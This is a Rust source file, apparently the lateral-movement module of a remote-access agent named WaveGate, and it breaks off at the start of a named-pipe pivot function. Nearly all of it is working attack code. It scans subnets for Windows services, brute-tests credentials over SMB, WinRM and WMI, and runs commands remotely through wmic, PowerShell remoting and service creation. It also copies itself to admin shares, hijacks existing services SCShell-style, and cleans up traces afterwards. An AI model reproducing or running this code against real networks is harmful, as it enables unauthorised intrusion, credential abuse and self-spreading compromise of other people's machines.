//! Lateral movement module.
//!
//! Provides network discovery, credential testing, and remote execution
//! capabilities for moving laterally across a network.

use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpStream};
use std::time::Duration;
use std::process::{Command, Stdio};
use std::collections::HashMap;

use wavegate_shared::{CommandResponseData, NetworkHost, SmbShare};

/// Default ports to scan for Windows services
const DEFAULT_PORTS: &[u16] = &[445, 135, 139, 5985, 5986, 3389];

/// Scan timeout per port in milliseconds
const SCAN_TIMEOUT_MS: u64 = 500;

// ============================================================================
// Network Discovery
// ============================================================================

/// Scan a network subnet for live hosts
pub fn scan_network(subnet: &str, ports: Option<Vec<u16>>) -> (bool, CommandResponseData) {
    scan_network_with_progress(subnet, ports, |_, _| {})
}

/// Scan a network subnet for live hosts with progress callback
pub fn scan_network_with_progress<F>(subnet: &str, ports: Option<Vec<u16>>, progress_callback: F) -> (bool, CommandResponseData)
where
    F: Fn(u32, u32) + Send + 'static,
{
    let ports = ports.unwrap_or_else(|| DEFAULT_PORTS.to_vec());

    // Parse subnet
    let (base_ip, mask) = match parse_subnet(subnet) {
        Some(result) => result,
        None => {
            // If "auto", detect local subnet
            if subnet == "auto" {
                match get_local_subnet() {
                    Some(result) => result,
                    None => {
                        return (false, CommandResponseData::Error {
                            message: "Failed to detect local subnet".to_string(),
                        });
                    }
                }
            } else {
                return (false, CommandResponseData::Error {
                    message: format!("Invalid subnet format: {}", subnet),
                });
            }
        }
    };

    let mut hosts = Vec::new();
    let ip_range = generate_ip_range(base_ip, mask);
    let total = ip_range.len() as u32;

    for (idx, ip) in ip_range.into_iter().enumerate() {
        let ip_str = ip.to_string();

        // Send progress update every 5 hosts or at start/end
        if idx % 5 == 0 || idx as u32 == total - 1 {
            progress_callback(idx as u32 + 1, total);
        }

        let open_ports = scan_ports(&ip_str, &ports);

        if !open_ports.is_empty() {
            let hostname = resolve_hostname(&ip_str);
            let mac = get_mac_address(&ip_str);
            let os_hint = guess_os(&open_ports);

            hosts.push(NetworkHost {
                ip: ip_str,
                hostname,
                open_ports,
                mac,
                os_hint,
            });
        }
    }

    (true, CommandResponseData::LateralScanResult { hosts })
}

/// Parse subnet string like "192.168.1.0/24"
fn parse_subnet(subnet: &str) -> Option<(Ipv4Addr, u8)> {
    let parts: Vec<&str> = subnet.split('/').collect();
    if parts.len() != 2 {
        return None;
    }

    let ip: Ipv4Addr = parts[0].parse().ok()?;
    let mask: u8 = parts[1].parse().ok()?;

    if mask > 32 {
        return None;
    }

    Some((ip, mask))
}

/// Get local subnet automatically
fn get_local_subnet() -> Option<(Ipv4Addr, u8)> {
    // Get local IPs and assume /24 for the first private IP
    if let Ok(interfaces) = local_ip_address::list_afinet_netifas() {
        for (_, ip) in interfaces {
            if let IpAddr::V4(ipv4) = ip {
                if ipv4.is_private() {
                    // Create base network address with /24
                    let octets = ipv4.octets();
                    let base = Ipv4Addr::new(octets[0], octets[1], octets[2], 0);
                    return Some((base, 24));
                }
            }
        }
    }
    None
}

/// Generate IP range from base and mask
fn generate_ip_range(base: Ipv4Addr, mask: u8) -> Vec<Ipv4Addr> {
    let mut ips = Vec::new();
    let base_u32 = u32::from(base);
    let host_bits = 32 - mask;
    let num_hosts = 1u32 << host_bits;

    // Skip network address (first) and broadcast (last)
    for i in 1..(num_hosts - 1) {
        let ip_u32 = (base_u32 & !(num_hosts - 1)) | i;
        ips.push(Ipv4Addr::from(ip_u32));
    }

    ips
}

/// Scan ports on a single host
fn scan_ports(ip: &str, ports: &[u16]) -> Vec<u16> {
    let mut open = Vec::new();
    let timeout = Duration::from_millis(SCAN_TIMEOUT_MS);

    for &port in ports {
        if let Ok(addr) = format!("{}:{}", ip, port).parse::<SocketAddr>() {
            if TcpStream::connect_timeout(&addr, timeout).is_ok() {
                open.push(port);
            }
        }
    }

    open
}

/// Resolve hostname via reverse DNS
fn resolve_hostname(ip: &str) -> Option<String> {
    use std::net::ToSocketAddrs;

    // Try reverse DNS lookup using system resolver
    let output = Command::new("nslookup")
        .arg(ip)
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Parse nslookup output for "Name:" line
    for line in stdout.lines() {
        if line.trim().starts_with("Name:") {
            return Some(line.trim().replace("Name:", "").trim().to_string());
        }
    }

    None
}

/// Get MAC address from ARP cache
fn get_mac_address(ip: &str) -> Option<String> {
    let output = Command::new("arp")
        .args(["-a", ip])
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .output()
        .ok()?;

    let stdout = String::from_utf8_lossy(&output.stdout);

    // Parse ARP output for MAC address
    for line in stdout.lines() {
        if line.contains(ip) {
            // Windows ARP format: IP  MAC  Type
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let mac = parts[1];
                // Validate it looks like a MAC
                if mac.contains('-') || mac.contains(':') {
                    return Some(mac.to_string());
                }
            }
        }
    }

    None
}

/// Guess OS based on open ports
fn guess_os(ports: &[u16]) -> Option<String> {
    let has_smb = ports.contains(&445) || ports.contains(&139);
    let has_rpc = ports.contains(&135);
    let has_winrm = ports.contains(&5985) || ports.contains(&5986);
    let has_rdp = ports.contains(&3389);

    if has_smb && has_rpc {
        if has_winrm {
            Some("Windows (WinRM enabled)".to_string())
        } else if has_rdp {
            Some("Windows (RDP enabled)".to_string())
        } else {
            Some("Windows".to_string())
        }
    } else if has_smb {
        Some("Windows/Samba".to_string())
    } else {
        None
    }
}

// ============================================================================
// SMB Share Enumeration
// ============================================================================

/// Enumerate SMB shares on a remote host
pub fn enum_shares(host: &str) -> (bool, CommandResponseData) {
    let output = Command::new("net")
        .args(["view", &format!("\\\\{}", host)])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(out) => {
            if out.status.success() {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let shares = parse_net_view_output(&stdout);
                (true, CommandResponseData::LateralSharesResult { shares })
            } else {
                let stderr = String::from_utf8_lossy(&out.stderr);
                (false, CommandResponseData::Error {
                    message: format!("Failed to enumerate shares: {}", stderr.trim()),
                })
            }
        }
        Err(e) => (false, CommandResponseData::Error {
            message: format!("Failed to run net view: {}", e),
        }),
    }
}

/// Parse output from "net view" command
fn parse_net_view_output(output: &str) -> Vec<SmbShare> {
    let mut shares = Vec::new();
    let mut in_share_list = false;

    for line in output.lines() {
        let line = line.trim();

        // Skip header lines until we hit the separator
        if line.starts_with("---") {
            in_share_list = true;
            continue;
        }

        if !in_share_list || line.is_empty() {
            continue;
        }

        // Parse share line: "ShareName  Type  Remark"
        let parts: Vec<&str> = line.splitn(3, char::is_whitespace).collect();
        if !parts.is_empty() {
            let name = parts[0].to_string();
            let share_type = parts.get(1).map(|s| s.to_string()).unwrap_or_else(|| "Unknown".to_string());
            let remark = parts.get(2).map(|s| s.trim().to_string()).filter(|s| !s.is_empty());

            shares.push(SmbShare {
                name,
                share_type,
                remark,
                accessible: true, // If we can see it, we have some access
            });
        }
    }

    shares
}

// ============================================================================
// Credential Testing
// ============================================================================

/// Test credentials against a remote host
pub fn test_credentials(host: &str, username: &str, password: &str, protocol: &str) -> (bool, CommandResponseData) {
    // Wrap in catch_unwind and add timeout protection
    let host = host.to_string();
    let username = username.to_string();
    let password = password.to_string();
    let protocol = protocol.to_string();

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        match protocol.to_lowercase().as_str() {
            "smb" => test_smb_creds(&host, &username, &password),
            "winrm" => test_winrm_creds(&host, &username, &password),
            "wmi" => test_wmi_creds(&host, &username, &password),
            _ => Err(format!("Unknown protocol: {}", protocol)),
        }
    }));

    match result {
        Ok(Ok(msg)) => (true, CommandResponseData::LateralCredentialResult {
            success: true,
            message: msg,
        }),
        Ok(Err(msg)) => (true, CommandResponseData::LateralCredentialResult {
            success: false,
            message: msg,
        }),
        Err(_) => (false, CommandResponseData::LateralCredentialResult {
            success: false,
            message: "Credential test failed (internal error)".to_string(),
        }),
    }
}

/// Test SMB credentials using net use
fn test_smb_creds(host: &str, username: &str, password: &str) -> Result<String, String> {
    let target = format!("\\\\{}\\IPC$", host);

    // First, delete any existing connection
    let _ = Command::new("net")
        .args(["use", &target, "/delete", "/y"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    // Try to connect with credentials
    let output = Command::new("net")
        .args(["use", &target, &format!("/user:{}", username), password])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .map_err(|e| format!("Failed to run net use: {}", e))?;

    // Clean up connection regardless of result
    let _ = Command::new("net")
        .args(["use", &target, "/delete", "/y"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    if output.status.success() {
        Ok(format!("SMB authentication successful for {}@{}", username, host))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("SMB authentication failed: {}", stderr.trim()))
    }
}

/// Test WinRM credentials using PowerShell
fn test_winrm_creds(host: &str, username: &str, password: &str) -> Result<String, String> {
    let script = format!(
        r#"$pw = ConvertTo-SecureString '{}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('{}', $pw); Test-WSMan -ComputerName {} -Credential $cred -Authentication Default -ErrorAction Stop"#,
        password.replace("'", "''"), username, host
    );

    let output = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .map_err(|e| format!("Failed to run PowerShell: {}", e))?;

    if output.status.success() {
        Ok(format!("WinRM authentication successful for {}@{}", username, host))
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("WinRM authentication failed: {}", stderr.trim()))
    }
}

/// Test WMI credentials using wmic
fn test_wmi_creds(host: &str, username: &str, password: &str) -> Result<String, String> {
    let output = Command::new("wmic")
        .args([
            &format!("/node:{}", host),
            &format!("/user:{}", username),
            &format!("/password:{}", password),
            "os",
            "get",
            "caption",
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .map_err(|e| format!("Failed to run wmic: {}", e))?;

    if output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        if stdout.contains("Windows") {
            Ok(format!("WMI authentication successful for {}@{}", username, host))
        } else {
            Err("WMI authentication failed: unexpected response".to_string())
        }
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        Err(format!("WMI authentication failed: {}", stderr.trim()))
    }
}

// ============================================================================
// Remote Execution
// ============================================================================

/// Execute command via WMI
pub fn exec_wmi(host: &str, username: &str, password: &str, command: &str) -> (bool, CommandResponseData) {
    let output = Command::new("wmic")
        .args([
            &format!("/node:{}", host),
            &format!("/user:{}", username),
            &format!("/password:{}", password),
            "process",
            "call",
            "create",
            command,
        ])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);

            if out.status.success() && stdout.contains("ReturnValue = 0") {
                (true, CommandResponseData::LateralExecResult {
                    success: true,
                    output: format!("Command executed successfully via WMI\n{}", stdout),
                })
            } else {
                (false, CommandResponseData::LateralExecResult {
                    success: false,
                    output: format!("WMI execution failed:\n{}\n{}", stdout, stderr),
                })
            }
        }
        Err(e) => (false, CommandResponseData::LateralExecResult {
            success: false,
            output: format!("Failed to run wmic: {}", e),
        }),
    }
}

/// Execute command via WinRM/PSRemoting
pub fn exec_winrm(host: &str, username: &str, password: &str, command: &str) -> (bool, CommandResponseData) {
    let script = format!(
        r#"$pw = ConvertTo-SecureString '{}' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('{}', $pw); Invoke-Command -ComputerName {} -Credential $cred -ScriptBlock {{ {} }}"#,
        password.replace("'", "''"),
        username,
        host,
        command.replace("'", "''")
    );

    let output = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);

            if out.status.success() {
                (true, CommandResponseData::LateralExecResult {
                    success: true,
                    output: stdout.to_string(),
                })
            } else {
                (false, CommandResponseData::LateralExecResult {
                    success: false,
                    output: format!("WinRM execution failed:\n{}\n{}", stdout, stderr),
                })
            }
        }
        Err(e) => (false, CommandResponseData::LateralExecResult {
            success: false,
            output: format!("Failed to run PowerShell: {}", e),
        }),
    }
}

/// Execute command via SMB + remote service creation
pub fn exec_smb(host: &str, username: &str, password: &str, command: &str) -> (bool, CommandResponseData) {
    // Generate random service name
    let svc_name: String = (0..8)
        .map(|_| {
            let idx = fastrand::usize(0..26);
            (b'a' + idx as u8) as char
        })
        .collect();

    // Map the admin share first
    let admin_share = format!("\\\\{}\\ADMIN$", host);

    // Delete any existing connection
    let _ = Command::new("net")
        .args(["use", &admin_share, "/delete", "/y"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    // Connect with credentials
    let connect = Command::new("net")
        .args(["use", &admin_share, &format!("/user:{}", username), password])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    if let Err(e) = connect {
        return (false, CommandResponseData::LateralExecResult {
            success: false,
            output: format!("Failed to connect to ADMIN$: {}", e),
        });
    }

    // Create remote service using sc
    let binpath = format!("cmd.exe /c {}", command);
    let create = Command::new("sc")
        .args([&format!("\\\\{}", host), "create", &svc_name, "binpath=", &binpath])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    if let Err(e) = create {
        let _ = Command::new("net").args(["use", &admin_share, "/delete", "/y"]).output();
        return (false, CommandResponseData::LateralExecResult {
            success: false,
            output: format!("Failed to create service: {}", e),
        });
    }

    // Start the service
    let start = Command::new("sc")
        .args([&format!("\\\\{}", host), "start", &svc_name])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    // Delete the service (cleanup)
    let _ = Command::new("sc")
        .args([&format!("\\\\{}", host), "delete", &svc_name])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    // Disconnect
    let _ = Command::new("net")
        .args(["use", &admin_share, "/delete", "/y"])
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .output();

    match start {
        Ok(out) => {
            // Service start for a "cmd /c" command will usually fail because cmd exits
            // but the command still runs. Check if service was created successfully.
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);

            (true, CommandResponseData::LateralExecResult {
                success: true,
                output: format!("Command executed via SMB service creation\nService: {}\n{}{}",
                    svc_name, stdout, stderr),
            })
        }
        Err(e) => (false, CommandResponseData::LateralExecResult {
            success: false,
            output: format!("Failed to start service: {}", e),
        }),
    }
}

// ============================================================================
// Deployment
// ============================================================================

/// Deploy WaveGate client to remote host
pub fn deploy_client(host: &str, username: &str, password: &str, method: &str) -> (bool, CommandResponseData) {
    // Get path to our own executable
    let exe_path = match std::env::current_exe() {
        Ok(p) => p,
        Err(e) => {
            return (false, CommandResponseData::LateralDeployResult {
                success: false,
                message: format!("Failed to get current exe path: {}", e),
            });
        }
    };

    let exe_name = exe_path.file_name()
        .map(|n| n.to_string_lossy().to_string())
        .unwrap_or_else(|| "client.exe".to_string());

    // Connect to C$ share
    let c_share = format!("\\\\{}\\C$", host);

    let _ = Command::new("net")
        .args(["use", &c_share, "/delete", "/y"])
        .output();

    let connect = Command::new("net")
        .args(["use", &c_share, &format!("/user:{}", username), password])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match connect {
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return (false, CommandResponseData::LateralDeployResult {
                success: false,
                message: format!("Failed to connect to C$: {}", stderr.trim()),
            });
        }
        Err(e) => {
            return (false, CommandResponseData::LateralDeployResult {
                success: false,
                message: format!("Failed to connect to C$: {}", e),
            });
        }
        _ => {}
    }

    // Copy executable to remote host
    let remote_path = format!("{}\\Windows\\Temp\\{}", c_share, exe_name);
    let copy = std::fs::copy(&exe_path, &remote_path);

    if let Err(e) = copy {
        let _ = Command::new("net").args(["use", &c_share, "/delete", "/y"]).output();
        return (false, CommandResponseData::LateralDeployResult {
            success: false,
            message: format!("Failed to copy executable: {}", e),
        });
    }

    // Execute based on method
    let remote_exe_path = format!("C:\\Windows\\Temp\\{}", exe_name);
    let exec_result = match method.to_lowercase().as_str() {
        "wmi" => exec_wmi(host, username, password, &remote_exe_path),
        "winrm" => exec_winrm(host, username, password, &format!("Start-Process '{}'", remote_exe_path)),
        "smb" => exec_smb(host, username, password, &remote_exe_path),
        _ => {
            let _ = Command::new("net").args(["use", &c_share, "/delete", "/y"]).output();
            return (false, CommandResponseData::LateralDeployResult {
                success: false,
                message: format!("Unknown deployment method: {}", method),
            });
        }
    };

    // Cleanup connection
    let _ = Command::new("net")
        .args(["use", &c_share, "/delete", "/y"])
        .output();

    match exec_result {
        (true, _) => (true, CommandResponseData::LateralDeployResult {
            success: true,
            message: format!("Successfully deployed client to {} via {}", host, method),
        }),
        (false, CommandResponseData::LateralExecResult { output, .. }) => {
            (false, CommandResponseData::LateralDeployResult {
                success: false,
                message: format!("Deployment failed: {}", output),
            })
        }
        _ => (false, CommandResponseData::LateralDeployResult {
            success: false,
            message: "Deployment failed: unknown error".to_string(),
        }),
    }
}

// ============================================================================
// Jump Commands (Remote Execution with Payload Deployment)
// ============================================================================

use std::sync::atomic::{AtomicU32, Ordering};
use parking_lot::RwLock;
use once_cell::sync::Lazy;
use wavegate_shared::PivotInfo;

use windows::Win32::Foundation::{HANDLE, CloseHandle, GENERIC_READ, GENERIC_WRITE};
use windows::Win32::Storage::FileSystem::{
    CreateFileW, ReadFile, WriteFile, FILE_SHARE_READ, FILE_SHARE_WRITE,
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, FILE_FLAG_OVERLAPPED,
};
use windows::core::PCWSTR;

/// Counter for pivot IDs
static PIVOT_ID_COUNTER: AtomicU32 = AtomicU32::new(1);

/// Active pivot connections
static PIVOT_STORE: Lazy<RwLock<HashMap<u32, PivotConnection>>> = Lazy::new(|| RwLock::new(HashMap::new()));

/// Pivot connection holding the pipe handle
struct PivotConnection {
    handle: HANDLE,
    host: String,
    pipe_name: String,
    status: String,
    bytes_sent: u64,
    bytes_received: u64,
}

// HANDLE is just a pointer, safe to send between threads with proper synchronization
unsafe impl Send for PivotConnection {}
unsafe impl Sync for PivotConnection {}

impl Drop for PivotConnection {
    fn drop(&mut self) {
        unsafe {
            let _ = CloseHandle(self.handle);
        }
    }
}

/// Resolve executable path - use current exe if empty/special value
fn resolve_executable_path(executable_path: &str) -> Result<std::path::PathBuf, String> {
    if executable_path.is_empty() || executable_path == "self" || executable_path == "current" {
        std::env::current_exe()
            .map_err(|e| format!("Failed to get current executable path: {}", e))
    } else {
        let path = std::path::PathBuf::from(executable_path);
        if path.exists() {
            Ok(path)
        } else {
            Err(format!("Executable not found: {}", executable_path))
        }
    }
}

/// SCShell: Hijack an existing service to run payload, then restore original path
pub fn jump_scshell(host: &str, service_name: &str, executable_path: &str) -> (bool, CommandResponseData) {
    let mut steps = Vec::new();

    // Resolve executable path (use current agent if empty)
    let exe_path = match resolve_executable_path(executable_path) {
        Ok(p) => {
            if executable_path.is_empty() || executable_path == "self" {
                steps.push(format!("Using current agent: {}", p.display()));
            }
            p
        }
        Err(e) => {
            return (false, CommandResponseData::JumpResult {
                success: false,
                method: "scshell".to_string(),
                host: host.to_string(),
                message: e,
                steps,
            });
        }
    };

    // Step 1: Connect to admin share to copy executable
    let c_share = format!("\\\\{}\\C$", host);
    steps.push(format!("Connecting to {}...", c_share));

    let connect = Command::new("net")
        .args(["use", &c_share])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    if let Err(e) = connect {
        return (false, CommandResponseData::JumpResult {
            success: false,
            method: "scshell".to_string(),
            host: host.to_string(),
            message: format!("Failed to connect to C$: {}", e),
            steps,
        });
    }

    // Step 2: Copy executable to remote host
    let remote_path = format!("{}\\Windows\\{}.exe", c_share, service_name);
    steps.push(format!("Copying payload to {}...", remote_path));

    if let Err(e) = std::fs::copy(&exe_path, &remote_path) {
        let _ = Command::new("net").args(["use", &c_share, "/delete", "/y"]).output();
        return (false, CommandResponseData::JumpResult {
            success: false,
            method: "scshell".to_string(),
            host: host.to_string(),
            message: format!("Failed to copy executable: {}", e),
            steps,
        });
    }
    steps.push(format!("Dropped service executable at \\\\{}\\C$\\Windows\\{}.exe", host, service_name));

    // Step 3: Query original service path
    let sc_target = format!("\\\\{}", host);
    steps.push(format!("Querying original service path for {}...", service_name));

    let query = Command::new("sc")
        .args([&sc_target, "qc", service_name])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    let original_path = match query {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            // Parse BINARY_PATH_NAME from output
            stdout.lines()
                .find(|line| line.contains("BINARY_PATH_NAME"))
                .and_then(|line| line.split(':').nth(1))
                .map(|p| p.trim().to_string())
                .unwrap_or_default()
        }
        Err(_) => String::new(),
    };

    if original_path.is_empty() {
        let _ = std::fs::remove_file(&remote_path);
        let _ = Command::new("net").args(["use", &c_share, "/delete", "/y"]).output();
        return (false, CommandResponseData::JumpResult {
            success: false,
            method: "scshell".to_string(),
            host: host.to_string(),
            message: format!("Failed to query service {} or service not found", service_name),
            steps,
        });
    }
    steps.push(format!("Original service path: {}", original_path));

    // Step 4: Modify service to our payload
    let payload_path = format!("C:\\Windows\\{}.exe", service_name);
    steps.push(format!("Modifying service binpath to {}...", payload_path));

    let modify = Command::new("sc")
        .args([&sc_target, "config", service_name, "binpath=", &payload_path])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    if let Err(e) = modify {
        let _ = std::fs::remove_file(&remote_path);
        let _ = Command::new("net").args(["use", &c_share, "/delete", "/y"]).output();
        return (false, CommandResponseData::JumpResult {
            success: false,
            method: "scshell".to_string(),
            host: host.to_string(),
            message: format!("Failed to modify service: {}", e),
            steps,
        });
    }

    // Step 5: Start the service (this runs our payload)
    steps.push(format!("Starting service {}...", service_name));

    let start = Command::new("sc")
        .args([&sc_target, "start", service_name])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    // Service might fail to start (expected for non-service executables), but payload runs
    if let Ok(out) = &start {
        let stdout = String::from_utf8_lossy(&out.stdout);
        let stderr = String::from_utf8_lossy(&out.stderr);
        if stdout.contains("START_PENDING") || stdout.contains("RUNNING") {
            steps.push(format!("Service {} started!", service_name));
        } else {
            steps.push(format!("Service start response: {}{}", stdout.trim(), stderr.trim()));
        }
    }

    // Step 6: Restore original service path
    steps.push(format!("Restoring original service path..."));

    let _ = Command::new("sc")
        .args([&sc_target, "config", service_name, "binpath=", &original_path])
        .output();

    steps.push(format!("Service path restored to: {}", original_path));

    // Cleanup
    let _ = Command::new("net").args(["use", &c_share, "/delete", "/y"]).output();

    (true, CommandResponseData::JumpResult {
        success: true,
        method: "scshell".to_string(),
        host: host.to_string(),
        message: format!("SCShell successfully executed on {}", host),
        steps,
    })
}

/// PsExec-style: Copy executable, create new service, start, cleanup
pub fn jump_psexec(host: &str, service_name: &str, executable_path: &str) -> (bool, CommandResponseData) {
    let mut steps = Vec::new();

    // Resolve executable path (use current agent if empty)
    let exe_path = match resolve_executable_path(executable_path) {
        Ok(p) => {
            if executable_path.is_empty() || executable_path == "self" {
                steps.push(format!("Using current agent: {}", p.display()));
            }
            p
        }
        Err(e) => {
            return (false, CommandResponseData::JumpResult {
                success: false,
                method: "psexec".to_string(),
                host: host.to_string(),
                message: e,
                steps,
            });
        }
    };

    // Step 1: Connect to admin share
    let admin_share = format!("\\\\{}\\ADMIN$", host);
    steps.push(format!("Connecting to {}...", admin_share));

    let connect = Command::new("net")
        .args(["use", &admin_share])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    if let Err(e) = connect {
        return (false, CommandResponseData::JumpResult {
            success: false,
            method: "psexec".to_string(),
            host: host.to_string(),
            message: format!("Failed to connect to ADMIN$: {}", e),
            steps,
        });
    }

    // Step 2: Copy executable
    let remote_path = format!("{}\\{}.exe", admin_share, service_name);
    steps.push(format!("Copying payload to {}...", remote_path));

    if let Err(e) = std::fs::copy(&exe_path, &remote_path) {
        let _ = Command::new("net").args(["use", &admin_share, "/delete", "/y"]).output();
        return (false, CommandResponseData::JumpResult {
            success: false,
            method: "psexec".to_string(),
            host: host.to_string(),
            message: format!("Failed to copy executable: {}", e),
            steps,
        });
    }
    steps.push(format!("Dropped executable at \\\\{}\\ADMIN$\\{}.exe", host, service_name));

    // Step 3: Create service
    let sc_target = format!("\\\\{}", host);
    let binpath = format!("C:\\Windows\\{}.exe", service_name);
    steps.push(format!("Creating service {} with binpath {}...", service_name, binpath));

    let create = Command::new("sc")
        .args([&sc_target, "create", service_name, "binpath=", &binpath, "start=", "demand"])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match create {
        Ok(out) => {
            if !out.status.success() {
                let stderr = String::from_utf8_lossy(&out.stderr);
                let _ = std::fs::remove_file(&remote_path);
                let _ = Command::new("net").args(["use", &admin_share, "/delete", "/y"]).output();
                return (false, CommandResponseData::JumpResult {
                    success: false,
                    method: "psexec".to_string(),
                    host: host.to_string(),
                    message: format!("Failed to create service: {}", stderr.trim()),
                    steps,
                });
            }
            steps.push(format!("Service {} created", service_name));
        }
        Err(e) => {
            let _ = std::fs::remove_file(&remote_path);
            let _ = Command::new("net").args(["use", &admin_share, "/delete", "/y"]).output();
            return (false, CommandResponseData::JumpResult {
                success: false,
                method: "psexec".to_string(),
                host: host.to_string(),
                message: format!("Failed to create service: {}", e),
                steps,
            });
        }
    }

    // Step 4: Start service
    steps.push(format!("Starting service {}...", service_name));

    let start = Command::new("sc")
        .args([&sc_target, "start", service_name])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    if let Ok(out) = &start {
        let stdout = String::from_utf8_lossy(&out.stdout);
        if stdout.contains("START_PENDING") || stdout.contains("RUNNING") {
            steps.push(format!("Service {} started!", service_name));
        } else {
            steps.push("Service start initiated (payload executing)".to_string());
        }
    }

    // Step 5: Delete service (cleanup)
    steps.push(format!("Cleaning up service {}...", service_name));

    // Small delay to let payload execute
    std::thread::sleep(Duration::from_millis(500));

    let _ = Command::new("sc")
        .args([&sc_target, "stop", service_name])
        .output();

    let _ = Command::new("sc")
        .args([&sc_target, "delete", service_name])
        .output();

    steps.push(format!("Service {} deleted", service_name));

    // Cleanup share connection
    let _ = Command::new("net").args(["use", &admin_share, "/delete", "/y"]).output();

    (true, CommandResponseData::JumpResult {
        success: true,
        method: "psexec".to_string(),
        host: host.to_string(),
        message: format!("PsExec successfully executed on {}", host),
        steps,
    })
}

/// WinRM: Deploy and execute via PowerShell remoting
pub fn jump_winrm(host: &str, executable_path: &str) -> (bool, CommandResponseData) {
    let mut steps = Vec::new();

    // Resolve executable path (use current agent if empty)
    let exe_path = match resolve_executable_path(executable_path) {
        Ok(p) => {
            if executable_path.is_empty() || executable_path == "self" {
                steps.push(format!("Using current agent: {}", p.display()));
            }
            p
        }
        Err(e) => {
            return (false, CommandResponseData::JumpResult {
                success: false,
                method: "winrm".to_string(),
                host: host.to_string(),
                message: e,
                steps,
            });
        }
    };

    // Read executable data
    let exe_data = match std::fs::read(&exe_path) {
        Ok(data) => data,
        Err(e) => {
            return (false, CommandResponseData::JumpResult {
                success: false,
                method: "winrm".to_string(),
                host: host.to_string(),
                message: format!("Failed to read executable: {}", e),
                steps,
            });
        }
    };

    // Base64 encode
    use base64::Engine;
    let b64_data = base64::engine::general_purpose::STANDARD.encode(&exe_data);
    steps.push(format!("Encoded payload ({} bytes -> {} chars)", exe_data.len(), b64_data.len()));

    // Generate random filename
    let remote_name: String = (0..8)
        .map(|_| (b'a' + fastrand::u8(0..26)) as char)
        .collect();
    let remote_path = format!("C:\\Windows\\Temp\\{}.exe", remote_name);

    // Build PowerShell script to decode and execute
    let ps_script = format!(
        r#"$b = [Convert]::FromBase64String('{}'); [IO.File]::WriteAllBytes('{}', $b); Start-Process '{}'"#,
        b64_data, remote_path, remote_path
    );

    steps.push(format!("Deploying to {} via WinRM...", host));

    // Execute via Invoke-Command
    let invoke_script = format!(
        r#"Invoke-Command -ComputerName {} -ScriptBlock {{ {} }}"#,
        host, ps_script
    );

    let output = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", &invoke_script])
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);

            if out.status.success() || stderr.is_empty() {
                steps.push(format!("Payload deployed to {}", remote_path));
                steps.push("Execution started via WinRM".to_string());

                (true, CommandResponseData::JumpResult {
                    success: true,
                    method: "winrm".to_string(),
                    host: host.to_string(),
                    message: format!("WinRM successfully executed on {}", host),
                    steps,
                })
            } else {
                steps.push(format!("Error: {}", stderr.trim()));

                (false, CommandResponseData::JumpResult {
                    success: false,
                    method: "winrm".to_string(),
                    host: host.to_string(),
                    message: format!("WinRM execution failed: {}", stderr.trim()),
                    steps,
                })
            }
        }
        Err(e) => {
            (false, CommandResponseData::JumpResult {
                success: false,
                method: "winrm".to_string(),
                host: host.to_string(),
                message: format!("Failed to execute PowerShell: {}", e),
                steps,
            })
        }
    }
}

// ============================================================================
// Pivot Commands (SMB Named Pipe Connections)
// ============================================================================

/// Connect to SMB named pipe on remote host for pivot
pub fn pivot_smb_connect(host: &str, pipe_name: &str) -> (bool, CommandResponseData) {
